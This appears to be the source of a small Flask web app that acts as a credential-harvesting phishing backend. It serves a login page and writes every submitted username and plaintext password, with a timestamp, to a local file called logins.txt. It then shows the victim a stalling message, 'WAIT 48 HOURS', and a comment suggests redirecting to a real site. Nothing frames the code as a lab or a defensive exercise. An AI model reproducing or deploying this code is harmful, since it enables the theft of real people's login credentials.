from flask import Flask, request, render_template, redirect
import datetime

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with open("logins.txt", "a") as f:
        f.write(f"[{time}] Username: {username}, Password: {password}\n")

    # Redirect to a real site or display a warning
    return "<h3 style='color:red;'>WAIT 48 HOURS</h3>"

if __name__ == '__main__':
    app.run(debug=True)
